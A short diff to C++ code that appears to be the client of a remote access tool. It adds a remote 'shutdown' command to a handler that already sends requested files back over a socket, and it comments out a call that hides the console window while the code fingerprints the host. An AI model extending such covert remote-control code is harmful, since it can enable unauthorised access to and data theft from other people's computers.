@@ -84,11 +84,14 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
 
   } else if (cmd == "download") {
     net::sendFile(&sock, (char*)args.c_str());
+
+  } else if (cmd == "shutdown") {
+    utils::shutdown();
   }
 }
 
 int main() {
-  FreeConsole();
+  // FreeConsole();
   G_UID = fingerprint::getUID();
 
   info = fingerprint::getOSInfo();
